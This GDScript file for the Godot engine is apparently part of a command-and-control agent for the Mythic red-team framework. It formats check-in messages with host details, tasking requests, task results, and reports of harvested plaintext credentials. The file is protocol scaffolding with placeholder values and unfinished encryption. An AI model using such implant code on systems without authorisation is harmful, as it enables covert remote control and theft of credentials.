extends Node

var checkin_done
var uuid_stage
var _config

const UUID_STAGE_PAYLOAD = "payload"
const UUID_STAGE_CALLBACK = "callback"

signal agent_response

func _ready():
	checkin_done = false
	uuid_stage = UUID_STAGE_PAYLOAD
	_config = $".".get_parent().get_node("config")

func checkin():
	checkin_done = true
	uuid_stage = UUID_STAGE_CALLBACK

func get_uuid():
	var uuid

	match uuid_stage:
		UUID_STAGE_PAYLOAD:
			uuid = _config.get_payload_uuid()
		UUID_STAGE_CALLBACK:
			uuid = _config.get_callback_uuid()
		_:
			uuid = false

	return uuid

func get_checkin_payload():
	# https:#docs.mythic-c2.net/customizing/c2-related-development/c2-profile-code/agent-side-coding/initial-checkin

	# TODO: gather value elements below and populate via. config
	var payload = {
		"action": "checkin", # required
		"ip": "127.0.0.1", # internal ip address - required
		"os": "Fedora 35", # os version - required
		"user": "its-a-feature", # username of current user - required
		"host": "spooky.local", # hostname of the computer - required
		"pid": 4444, # pid of the current process - required
		"uuid": get_uuid(), #uuid of the payload - required
		"architecture": "x64", # platform arch - optional
		"domain": "test", # domain of the host - optional
		"integrity_level": 3, # integrity level of the process - optional
		"external_ip": "8.8.8.8", # external ip if known - optional
		"encryption_key": "", # encryption key - optional
		"decryption_key": "", # decryption key - optional
	}

	return to_json(payload)

func get_tasking_payload():
	var payload = {
		"action": "get_tasking",
		"tasking_size": 1, # TODO: maths - calculate time between call and increase number by some amount?
		"delegates": [],
		"get_delegate_tasks": false,# no p2p for us at this time...
	}

	return to_json(payload)

func create_task_response(status, completed, task_id, output, artifacts = [], credentials = []):
	var payload = {
		"action": "post_response",
		"responses": [],
	}
	
	var task_response = {
		"task_id": task_id,
		"user_output": output,
		"artifacts": [],
		"status": "error",
		"completed": completed,
		"credentials": credentials
	}

	if status:
		task_response["status"] = "success"

	for artifact in artifacts:
		var entry = {}

		entry["base_artifact"] = artifact[0]
		entry["artifact"] = artifact[1]
		task_response["artifacts"].append(entry)

	payload["responses"].append(task_response) # TODO: create internal queue of task_response items and just return them all when agent checkin occures?

	print("returning payload from tasking: ", payload)

	return to_json(payload)

func create_credential_response(task_id, username, password, realm, message):
	var payload = {
		"task_id": task_id,
		"user_output": message,
		"credentials": [
			{
				"credential_type": "plaintext",
				"realm": realm,
				"credential": password,
				"account": username,
			}
		]
	}

	return to_json(payload)

func unwrap_payload(packet):	
	var ret = {
		"action": "",
		"payload": "",
		"uuid": "",
		"status": false
	}

	var data = Marshalls.base64_to_utf8(packet)
	
	print("unwrap payload was: ", data)

	# 8e8354de-bfb4-47c8-8162-f11dbe68801d{"status":"success","decryption_key":"","encryption_key":"","id":"f7cccca6-ef2c-4113-a282-a327db0a769b","action":"checkin"}

	ret["uuid"] = data.substr(0, 36)

	# TODO: decryption
	ret["payload"] = parse_json(data.substr(36))

	if ret["payload"].has("action"):
		ret["action"] = ret["payload"].get("action")

	if ret["payload"].has("status"):
		ret["status"] = ret["payload"].get("status") == "success"

	print("unwrap return: ", ret)

	return ret

func wrap_payload(payload):
	if _config.should_encrypt():
		pass # TODO: implement encryption
	else:
		payload = Marshalls.utf8_to_base64(get_uuid() + payload).to_utf8()

	return payload

func agent_response(payload):
	print("response payload: ", payload)

	payload = wrap_payload(payload)

	if payload:
		emit_signal("agent_response", payload)
	else:
		print("agent response empty / false : ", payload)


func _on_tasking_post_response(tasks):
	# {"action":"post_response","responses":[{"task_id":"e8e7f996-45db-4ed6-a6ea-2f013c747ef4","status":"success"}]}
	# TODO: keep queue and 'check off' items which are status success from the retry queue?
	print("_on_tasking_post_response: ", tasks)
